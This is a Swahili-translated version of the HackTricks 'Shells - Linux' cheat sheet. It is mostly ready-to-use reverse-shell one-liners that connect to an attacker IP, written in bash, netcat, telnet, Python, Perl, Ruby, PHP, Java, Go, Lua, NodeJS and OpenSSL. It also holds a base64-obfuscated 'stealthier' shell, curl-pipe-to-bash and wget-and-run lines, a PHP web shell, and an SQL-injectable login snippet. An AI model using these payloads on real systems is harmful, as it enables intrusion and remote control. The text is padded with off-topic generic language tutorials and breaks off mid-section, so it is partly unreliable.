# Shells - Linux

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Ikiwa una maswali kuhusu mojawapo ya haya maboya unaweza kuyachunguza kwa** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Marafiki unapopata kibonyezo cha nyuma**[ **soma ukurasa huu ili upate TTY kamili**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Usisahau kuangalia na mabawa mengine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.

### Kifaa salama cha ishara
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Maelezo ya Shell

1. **`bash -i`**: Sehemu hii ya amri inaanza kikao cha Bash cha kuingiliana (`-i`).
2. **`>&`**: Sehemu hii ya amri ni maelezo ya haraka ya **kuhamisha pato la kawaida** (`stdout`) na **kosa la kawaida** (`stderr`) kwa **marudio sawa**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum ambayo **inawakilisha uhusiano wa TCP kwa anwani ya IP na bandari iliyotajwa**.
* Kwa **kuhamisha mito ya pato na kosa kwenye faili hii**, amri inatuma kwa ufanisi pato la kikao cha shell cha kuingiliana kwenye kompyuta ya mshambuliaji.
4. **`0>&1`**: Sehemu hii ya amri **inahamisha kuingia kawaida (`stdin`) kwa marudio sawa na pato la kawaida (`stdout`)**.

### Unda kwenye faili na tekeleza
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Ikiwa utakutana na **mdororo wa RCE** ndani ya programu ya wavuti inayotumia Linux, kunaweza kuwa na hali ambapo **kupata kifaa cha kudhibiti kutoka mbali kunakuwa ngumu** kutokana na uwepo wa sheria za Iptables au vichujio vingine. Katika hali kama hizo, fikiria kuunda kifaa cha kudhibiti PTY ndani ya mfumo ulioathiriwa kwa kutumia mabomba.

Unaweza kupata nambari katika [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Unahitaji tu kubadilisha:

* URL ya mwenyeji mwenye udhaifu
* Kiambishi na kiambishi cha mzigo wako (ikiwa ipo)
* Jinsi mzigo unavyotumwa (vichwa vya habari? data? habari ziada?)

Kisha, unaweza tu **tuma amri** au hata **tumia amri ya `upgrade`** ili kupata PTY kamili (kumbuka kuwa mabomba yanachukua takriban kuchelewa kwa sekunde 1.3 kusoma na kuandika).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Angalia hapa [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet ni itifaki ya mtandao ambayo inaruhusu upatikanaji wa mbali kwa kutumia terminal ya mtandao. Inaruhusu mtumiaji kuunganisha na seva au kifaa kingine cha mtandao na kudhibiti na kuwasiliana nayo kupitia amri za terminal.

Telnet inaweza kutumika kwa madhumuni ya utawala wa mfumo, kudhibiti vifaa vya mtandao, au kwa kufanya uchunguzi wa usalama. Hata hivyo, kutokana na ukosefu wa usimbaji wa data, Telnet sio salama na inaweza kuwa hatari kwa sababu habari inayopitishwa inaweza kusomwa na kudukuliwa na watu wengine.

Kwa sababu ya hatari hizi za usalama, ni bora kutumia njia mbadala salama kama vile SSH badala ya Telnet. SSH inatoa usimbaji wa data na usalama zaidi wakati wa kuunganisha na kudhibiti vifaa vya mtandao.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Mshambuliaji**
```bash
while true; do nc -l <port>; done
```
Ili kutuma amri, andika chini, bonyeza enter na bonyeza CTRL+D (kukomesha STDIN)

**Mlengwa**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python ni lugha ya programu ambayo ni maarufu sana kwa maendeleo ya haraka na rahisi. Inatoa sintaksia rahisi na ina mkusanyiko mkubwa wa maktaba na moduli ambazo zinaweza kutumika kwa miradi mbalimbali.

### Kuanza na Python

Kuweka mazingira ya kufanya kazi na Python, unaweza kufuata hatua hizi:

1. Pakua na usakinishe Python kutoka kwenye tovuti rasmi ya Python.
2. Fungua terminal yako na angalia ikiwa Python imesakinishwa kwa kuchapisha amri `python --version`.
3. Ikiwa Python imesakinishwa, unaweza kuanza kutumia Python kwa kuchapisha amri `python` kwenye terminal.

### Kuchapisha kwenye Terminal

Katika Python, unaweza kutumia amri `print()` kuchapisha ujumbe kwenye terminal. Kwa mfano:

```python
print("Habari, dunia!")
```

### Kuchukua Ingizo kutoka kwenye Terminal

Unaweza pia kuchukua ingizo kutoka kwenye terminal kwa kutumia amri `input()`. Kwa mfano:

```python
jina = input("Tafadhali ingiza jina lako: ")
print("Habari, " + jina + "!")
```

### Kazi za Msingi za Python

Python ina kazi nyingi za msingi ambazo zinaweza kutumika kwa kazi mbalimbali. Hapa kuna baadhi ya kazi hizo:

- `len()`: Inatumika kupata urefu wa neno, orodha, au kamba.
- `type()`: Inatumika kupata aina ya kipengele.
- `range()`: Inatumika kuzalisha safu ya nambari.
- `int()`, `float()`, `str()`: Inatumika kubadilisha aina ya kipengele.

### Maktaba maarufu za Python

Python ina mkusanyiko mkubwa wa maktaba na moduli ambazo zinaweza kutumika kwa miradi mbalimbali. Hapa kuna baadhi ya maktaba maarufu:

- `requests`: Inatumika kufanya maombi ya HTTP.
- `numpy`: Inatumika kwa hesabu za kisayansi.
- `pandas`: Inatumika kwa uchambuzi wa data.
- `matplotlib`: Inatumika kwa kuunda michoro na chati.

### Kujifunza Zaidi

Ikiwa unataka kujifunza zaidi kuhusu Python, kuna vyanzo vingi vya kujifunza mkondoni. Hapa kuna baadhi ya vyanzo hivyo:

- [Python.org](https://www.python.org/): Tovuti rasmi ya Python.
- [W3Schools Python Tutorial](https://www.w3schools.com/python/): Mafunzo ya Python kutoka W3Schools.
- [Real Python](https://realpython.com/): Makala na mafunzo ya Python ya hali ya juu.

### Hitimisho

Python ni lugha yenye nguvu na rahisi ya programu ambayo inaweza kutumika kwa miradi mbalimbali. Kwa kujifunza Python, unaweza kuwa na uwezo wa kujenga programu za kisasa na kufanya kazi za kisayansi za data.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi katika uga wa udukuzi. Inatoa zana nyingi na maktaba ambazo zinaweza kutumiwa kwa kuchambua na kubadilisha data, kufanya uchunguzi wa mtandao, na kutekeleza shughuli zingine za udukuzi.

### Kuanzisha Perl Shell

Kuanzisha Perl Shell kwenye mfumo wa Linux, unaweza kutumia amri ifuatayo:

```bash
perl -e 'exec "/bin/sh";'
```

Amri hii itaunda shell ya Perl ambayo inaweza kutumika kwa kuingia kwenye mfumo na kutekeleza amri zingine.

### Kutekeleza Amri za Shell

Kutoka kwenye Perl Shell, unaweza kutekeleza amri za shell kwa kutumia kificho cha Perl. Kwa mfano, unaweza kutumia amri ifuatayo kuonyesha yaliyomo ya saraka ya sasa:

```perl
system("ls");
```

### Kuchambua na Kubadilisha Data

Perl inatoa zana nyingi za kuchambua na kubadilisha data. Unaweza kutumia kificho cha Perl kufanya shughuli kama vile kuchanganua faili za logi, kuchuja data, na kubadilisha muundo wa data.

### Uchunguzi wa Mtandao

Perl inaweza kutumika kwa uchunguzi wa mtandao na kufanya shughuli kama vile kuchanganua tovuti, kuchunguza mashimo ya usalama, na kufanya majaribio ya kuingilia kwenye mfumo.

### Matumizi Mengine ya Perl

Perl ina matumizi mengi katika uga wa udukuzi. Inaweza kutumika kwa kuchanganua faili za konfigurisheni, kufanya uchambuzi wa kificho, na kutekeleza shughuli zingine za udukuzi kulingana na mahitaji yako.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby ni lugha ya programu ya kisasa yenye nguvu na rahisi kutumia. Inajulikana kwa sintaksia yake rahisi na inayosoma kama lugha ya asili. Ruby inasaidia programu za kusimama pekee (standalone) na programu za mtandao.

### Kuanza

Ili kuanza kutumia Ruby, unahitaji kufunga Ruby interpreter kwenye mfumo wako. Unaweza kupakua na kufunga interpreter kutoka kwenye tovuti rasmi ya Ruby.

### Kufanya Kazi na Ruby

Unaweza kuandika na kutekeleza programu za Ruby kwa kutumia terminal au kwa kutumia mazingira ya maendeleo kama vile RubyMine au Visual Studio Code.

### Sintaksia ya Ruby

Ruby ina sintaksia rahisi na inayosoma kwa urahisi. Hapa kuna mfano wa programu ya Hello World katika Ruby:

```ruby
puts "Hello, World!"
```

Programu hii itachapisha ujumbe "Hello, World!" kwenye terminal.

### Maktaba za Ruby

Ruby ina maktaba nyingi za kujengwa ambazo zinaweza kukusaidia katika maendeleo ya programu. Unaweza kufunga maktaba hizi kwa kutumia mfumo wa usimamizi wa pakiti kama vile RubyGems.

### Mifano ya Programu

Hapa kuna baadhi ya mifano ya programu za Ruby:

- Programu ya kuhesabu wastani wa nambari
- Programu ya kubadilisha jina la faili
- Programu ya kuchanganua faili ya CSV

### Hitimisho

Ruby ni lugha yenye nguvu na rahisi kutumia ambayo inaweza kutumika kwa miradi mbalimbali ya programu. Kwa kujifunza Ruby, utaweza kuandika programu za kisasa na za kusisimua.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP ni lugha ya programu inayotumiwa sana kwa maendeleo ya wavuti. Inajulikana kwa urahisi wake wa kujifunza na matumizi yake ya kawaida katika maeneo mengi ya wavuti. PHP inaweza kutumika kwa kujenga programu za seva na kusindika fomu za wavuti.

### Kukimbia Amri za Shell

PHP inaweza kutumika kwa kukimbia amri za shell kwenye mfumo wa uendeshaji. Hii inaweza kuwa muhimu wakati wa kufanya uchunguzi wa usalama au kutekeleza hatua za kudhibiti kwenye seva.

Kwa mfano, unaweza kutumia amri ifuatayo ya PHP ili kukimbia amri ya shell:

```php
<?php
$output = shell_exec('ls -la');
echo "<pre>$output</pre>";
?>
```

Amri hii itakimbia amri ya "ls -la" kwenye mfumo wa uendeshaji na kutoa matokeo yake kwenye ukurasa wa wavuti.

### Kupata Shell ya Mbali

Kupata shell ya mbali kwenye seva iliyolengwa ni lengo kuu la wadukuzi wengi. PHP inaweza kutumika kama zana ya kufanikisha hili.

Kuna njia kadhaa za kupata shell ya mbali kwa kutumia PHP, kama vile:

- Kujenga faili ya PHP iliyobadilishwa ambayo inaweza kutekelezwa kwa kutumia URL maalum.
- Kuchapisha faili ya PHP iliyobadilishwa kwenye seva iliyolengwa na kuitumia kama mlango wa kuingia.

Kwa mfano, unaweza kutumia kificho kifuatacho cha PHP ili kujenga faili ya PHP iliyobadilishwa ambayo inaweza kutekelezwa kwa kutumia URL maalum:

```php
<?php
system($_GET['cmd']);
?>
```

Baada ya kuchapisha faili hii kwenye seva iliyolengwa, unaweza kutumia URL kama vile "http://www.example.com/shell.php?cmd=ls" ili kukimbia amri ya "ls" kwenye seva na kupata matokeo yake.

### Kuvunja Usalama wa Programu za PHP

Kuna njia kadhaa za kuvunja usalama wa programu za PHP, kama vile:

- Kuchunguza na kutumia udhaifu wa programu.
- Kufanya mashambulizi ya kawaida kama vile SQL injection na XSS.
- Kuchunguza faili za konfigurisheni zisizo salama au zilizowekwa vibaya.

Kwa mfano, unaweza kutumia kificho kifuatacho cha PHP ili kufanya mashambulizi ya SQL injection:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);

if (mysql_num_rows($result) > 0) {
    echo "Login successful";
} else {
    echo "Login failed";
}
?>
```

Kwa kutumia mbinu ya SQL injection, unaweza kuingiza maandishi maalum kwenye uwanja wa jina la mtumiaji au nenosiri ili kuvunja usalama wa programu na kupata ufikiaji usio halali.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java ni lugha ya programu inayotumika sana kwa maendeleo ya programu za rununu, programu za desktop, na programu za wavuti. Inajulikana kwa uwezo wake wa kuhamishika na kwa kuwa na sintaksia rahisi na inayoeleweka.

### Historia

Java ilianzishwa na James Gosling na timu yake katika kampuni ya Sun Microsystems mnamo mwaka wa 1995. Lengo lao lilikuwa kuunda lugha ya programu ambayo ingeweza kuendesha kwenye vifaa tofauti na mifumo ya uendeshaji.

### Sifa za Java

- **Uhamishaji**: Java inaweza kuendesha kwenye vifaa tofauti na mifumo ya uendeshaji, kama vile Windows, macOS, na Linux.
- **Usalama**: Java ina mfumo wa usalama thabiti ambao unazuia programu kufanya vitendo visivyoruhusiwa.
- **Sintaksia rahisi**: Java ina sintaksia rahisi na inayoeleweka, ambayo inafanya iwe rahisi kwa waendelezaji kujifunza na kuandika programu.
- **Uwezo wa kusambazwa**: Java inasaidia maendeleo ya programu za kusambazwa, ambazo zinaweza kuendesha sehemu tofauti za programu kwenye vifaa tofauti.
- **Uwezo wa kubadilika**: Java ina maktaba kubwa ya programu (API) ambayo inaruhusu waendelezaji kuunda programu za kipekee na za kubadilika.

### Matumizi ya Java

Java hutumiwa katika maeneo mengi ya maendeleo ya programu, pamoja na:

- Maendeleo ya programu za rununu: Java hutumiwa sana katika maendeleo ya programu za rununu kwa mifumo ya Android.
- Maendeleo ya programu za desktop: Java inaweza kutumika kuunda programu za desktop kwa mifumo ya Windows, macOS, na Linux.
- Maendeleo ya programu za wavuti: Java inaweza kutumika kuunda programu za wavuti za kisasa na za nguvu.

### Jifunze Java

Ili kujifunza Java, unaweza kutumia rasilimali zifuatazo:

- **Vitabu**: Kuna vitabu vingi vinavyopatikana ambavyo vinatoa maelezo ya kina juu ya lugha ya Java.
- **Kozi za mtandaoni**: Kuna kozi nyingi za mtandaoni zinazopatikana ambazo zinatoa mafunzo ya lugha ya Java.
- **Mashirika ya mafunzo**: Mashirika mengi ya mafunzo yanatoa mafunzo ya lugha ya Java kwa waendelezaji wa ngazi zote.

Kwa kujifunza Java, utaweza kuunda programu za kisasa na za nguvu kwa matumizi mbalimbali.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat ni chombo cha ushirikiano wa mtandao ambacho kinaweza kutumiwa kwa kusudi la kusikiliza na kutuma data kupitia mtandao. Ni zana yenye nguvu ambayo inaweza kutumiwa kwa madhumuni mbalimbali, kama vile kuanzisha uhusiano wa mtandao, kusikiliza na kurekodi trafiki ya mtandao, na kufanya uchunguzi wa usalama.

### Kusikiliza na Kutuma Data

Ncat inaweza kutumika kusikiliza na kutuma data kupitia mtandao. Unaweza kuanzisha seva ya Ncat kwenye kompyuta yako na kusikiliza kwa ujumbe au data inayotumwa kwako. Unaweza pia kutuma data kutoka kwa kompyuta yako kwenda kwa seva ya Ncat iliyowekwa kwenye kompyuta nyingine.

### Uhusiano wa Mtandao

Ncat inaweza kutumika kuanzisha uhusiano wa mtandao kati ya kompyuta mbili au zaidi. Unaweza kutumia Ncat kuunganisha kompyuta zako kwenye mtandao wa ndani au kwenye mtandao wa umma. Unaweza pia kutumia Ncat kuanzisha uhusiano wa mtandao kati ya kompyuta yako na seva ya mbali.

### Kurekodi Trafiki ya Mtandao

Ncat inaweza kutumika kusikiliza na kurekodi trafiki ya mtandao. Unaweza kuanzisha seva ya Ncat kwenye kompyuta yako na kurekodi trafiki ya mtandao inayopita kupitia kompyuta yako. Hii inaweza kuwa muhimu kwa uchunguzi wa usalama au kwa kujifunza jinsi trafiki ya mtandao inavyofanya kazi.

### Uchunguzi wa Usalama

Ncat inaweza kutumika kwa uchunguzi wa usalama. Unaweza kutumia Ncat kuchunguza mashimo ya usalama kwenye mtandao wako au kwenye seva yako. Unaweza pia kutumia Ncat kufanya majaribio ya kuingilia kwenye mfumo wako ili kubaini udhaifu na kuchukua hatua za kurekebisha.

Ncat ni zana yenye nguvu ambayo inaweza kutumiwa kwa madhumuni mbalimbali katika uwanja wa usalama wa mtandao. Kwa kujifunza jinsi ya kutumia Ncat, unaweza kuwa na uwezo wa kufanya shughuli za usalama wa mtandao kwa ufanisi zaidi.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua ni lugha ya programu ya kusudi la jumla ambayo inaweza kutumika kama lugha ya scripting au kama lugha ya programu kamili. Inajulikana kwa urahisi wake wa kujifunza, utendaji wake wa haraka, na ukubwa wake mdogo wa faili. Lua inasaidia uandishi wa programu kwa njia ya kielelezo na inaunganisha vizuri na lugha zingine za programu.

### Kuanzisha Mazingira ya Lua

Kuweka mazingira ya Lua kwenye mfumo wako, unahitaji kufuata hatua hizi:

1. Pakua na usakinishe toleo la hivi karibuni la Lua kutoka kwenye tovuti rasmi ya Lua.
2. Weka njia ya ufikiaji wa Lua kwenye mfumo wako kwa kuongeza njia ya ufikiaji kwenye faili ya mazingira ya mfumo (kama vile faili ya .bashrc au .bash_profile).
3. Hakikisha kuwa ufikiaji wa Lua umewekwa kwa kufunga moduli ya Lua kwa kutumia meneja wa pakiti kama vile luarocks.

### Kufanya Kazi na Lua

Kuna njia kadhaa za kufanya kazi na Lua:

- Unaweza kuandika programu za Lua kwa kutumia mhariri wa maandishi na kisha kuendesha programu hizo kwenye terminal.
- Unaweza kutumia mazingira ya maendeleo ya Lua kama vile ZeroBrane Studio au IntelliJ IDEA ili kuandika na kutekeleza programu za Lua.
- Unaweza pia kutumia Lua kama lugha ya scripting kwa kuunganisha na programu zingine au mifumo ya uendeshaji.

### Mifano ya Kanuni ya Lua

Hapa kuna mifano michache ya kanuni ya Lua:

```lua
-- Hii ni maoni ya mstari mmoja

--[[
Hii ni maoni ya mstari mrefu
inaweza kuwa maelezo ya programu
--]]

-- Kuchapisha ujumbe kwenye terminal
print("Hello, World!")

-- Kufanya hesabu
a = 5
b = 10
c = a + b
print(c)
```

### Vyanzo vya Rasilimali za Kujifunza Lua

Ikiwa unataka kujifunza zaidi kuhusu Lua, hapa kuna vyanzo vichache vya rasilimali:

- Tovuti rasmi ya Lua: [https://www.lua.org/](https://www.lua.org/)
- Kitabu cha "Programming in Lua" na Roberto Ierusalimschy
- Lua Reference Manual: [https://www.lua.org/manual/5.4/](https://www.lua.org/manual/5.4/)
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS ni mazingira ya maendeleo ya programu ambayo hutumia lugha ya JavaScript. Inaruhusu watengenezaji kuendesha kanuni ya JavaScript upande wa seva. NodeJS inajulikana kwa utendaji wake wa haraka na uwezo wake wa kushughulikia mzigo mkubwa wa kazi.

### Kuanzisha Shell ya NodeJS

Kuanzisha shell ya NodeJS ni rahisi. Unahitaji tu kufungua terminal na kuingia amri ifuatayo:

```bash
node
```

Hii itaanzisha shell ya NodeJS na utaweza kuanza kuandika na kutekeleza kanuni ya JavaScript.

### Kazi za Shell ya NodeJS

Shell ya NodeJS inatoa kazi nyingi muhimu ambazo zinaweza kutumiwa katika uchunguzi wa usalama na udukuzi. Hapa kuna baadhi ya kazi muhimu:

- **Kuendesha Kanuni ya JavaScript**: Unaweza kuandika na kutekeleza kanuni ya JavaScript moja kwa moja katika shell ya NodeJS.
- **Kupata Taarifa za Mazingira**: Unaweza kutumia shell ya NodeJS kupata taarifa za mazingira kama vile anwani ya IP, mfumo wa uendeshaji, na maelezo mengine ya seva.
- **Kuwasiliana na Seva za Nje**: Unaweza kutumia shell ya NodeJS kuwasiliana na seva za nje kwa kutumia itifaki kama HTTP, FTP, na TCP/IP.
- **Kusoma na Kuandika Faili**: Unaweza kutumia shell ya NodeJS kusoma na kuandika faili kwenye seva.
- **Kuunda Huduma za Mtandao**: Unaweza kutumia shell ya NodeJS kuunda huduma za mtandao kwa kutumia itifaki kama HTTP na WebSocket.

### Mifano ya Matumizi

Hapa kuna mifano michache ya matumizi ya shell ya NodeJS:

- Kupata anwani ya IP ya seva:

```javascript
const os = require('os');
console.log(os.networkInterfaces());
```

- Kupakua faili kutoka kwa seva ya nje:

```javascript
const https = require('https');
const fs = require('fs');

const file = fs.createWriteStream('file.txt');
https.get('https://example.com/file.txt', (response) => {
  response.pipe(file);
});
```

- Kuunda server ya HTTP:

```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello, World!');
});

server.listen(3000, 'localhost', () => {
  console.log('Server running at http://localhost:3000/');
});
```

### Hitimisho

Shell ya NodeJS ni chombo muhimu katika uchunguzi wa usalama na udukuzi. Inatoa njia rahisi ya kuandika na kutekeleza kanuni ya JavaScript upande wa seva. Kwa kutumia kazi zake mbalimbali, unaweza kufanya shughuli nyingi za usalama na udukuzi kwa ufanisi.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Mshambuliaji (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Mtu Mwenye Kudhulumiwa
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

### Kifungu cha Bind

Kifungu cha Bind ni mbinu ya kushikilia kwenye kifaa cha lengo na kusikiliza kwa uhusiano wa kuingia. Kwa kutumia Socat, unaweza kuanzisha kifungu cha Bind kwenye mfumo wa Linux. Hapa kuna hatua za kufuata:

1. Pakua toleo la Socat kulingana na usanidi wa mfumo wako kutoka kwenye kiungo hapo juu.
2. Weka faili ya Socat kwenye mfumo wa lengo.
3. Fungua terminal na tumia amri ifuatayo kuunda kifungu cha Bind:

```bash
